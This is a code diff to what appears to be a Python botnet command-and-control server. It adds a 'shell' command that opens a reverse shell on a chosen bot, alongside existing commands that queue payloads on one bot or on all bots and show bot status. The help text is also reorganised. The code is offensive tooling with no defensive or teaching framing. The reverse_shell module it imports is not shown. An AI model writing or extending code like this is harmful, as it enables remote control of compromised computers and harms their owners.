@@ -7,6 +7,7 @@
 
 from aiohttp import web
 from context import GlobalContext, Command
+from reverse_shell import reverse_shell
 import shlex
 import routes
 import aioconsole
@@ -117,30 +118,30 @@ async def main():
         command = shlex.split(text)
 
         try:
-            # one <id> <command>
             if command[0] == "one":
                 await queue_command_on_single_bot(ctx, command[1:])
-            # all <command>
             elif command[0] == "all":
                 await queue_command_on_all(ctx, command[1:])
-            # status
             elif command[0] == "status":
                 server_status(ctx)
-            # help
-            elif command[0] in ["?", "help"]:
-                print(("Commands:\n\n"
-                       "Execute payload on one bot:\n"
-                       "    one <id> <command>\n\n"
-                       "Execute payload on all bots:\n"
-                       "    all <command>\n\n"
-                       "Show status of connected bots:\n"
-                       "    status\n"))
-            # unknown
             elif command[0] == "exit":
                 print("Exiting...")
                 exit(0)
+            elif command[0] == "shell":
+                await reverse_shell(ctx, command[1])
             else:
                 print(f"unknown command '{command[0]}'")
+                print(("Commands:\n\n"
+                       "  'one': Execute payload on one bot\n"
+                       "     one <id> <command>\n\n"
+                       "  'all': Execute payload on all bots\n"
+                       "     all <command>\n\n"
+                       "  'status': Show status of connected bots\n"
+                       "     status\n"
+                       "  'shell': Opens a reverse shell on a specific bot\n"
+                       "     shell <id>\n"
+                       "  'exit': Kill the server\n"
+                       "     exit\n"))
         except Exception as e:
             print(f"unable to run command '{text}'. reason:")
             print(f"    {repr(e)}")
